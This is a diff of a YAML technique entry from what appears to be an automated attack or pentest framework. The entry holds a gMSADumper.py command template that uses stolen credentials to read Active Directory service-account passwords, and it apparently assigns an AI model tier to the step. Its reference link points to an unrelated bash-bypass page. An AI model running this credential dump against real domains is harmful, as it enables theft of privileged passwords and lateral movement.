@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: python3 gMSADumper.py -u '{username}' -p '{password}' -d {domain}
-  -l {target_ip}
+command_template: python3 gMSADumper.py -u '{username}' -p '{password}' -d {domain} -l {target_ip}
 parser: generic_parser
 expected_effects:
 - gmsa_password_read
@@ -16,7 +15,15 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: gMSA passwords auto-rotated, stored in msDS-ManagedPassword blob. Readable
-  by principals in PrincipalsAllowedToRetrieveManagedPassword. Often service accounts
-  with high privileges.
+mechanism: gMSA passwords auto-rotated, stored in msDS-ManagedPassword blob. Readable by principals in PrincipalsAllowedToRetrieveManagedPassword.
+  Often service accounts with high privileges.
 hacktricks_ref: linux-hardening/bypass-bash-restrictions/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 13896beabf
+  - 482ff8f95d
+  - 9829e0c622
+  - 9ba0fe0706
+  - d344079757
+  - d7c8eb4071
+  - edcb56b401
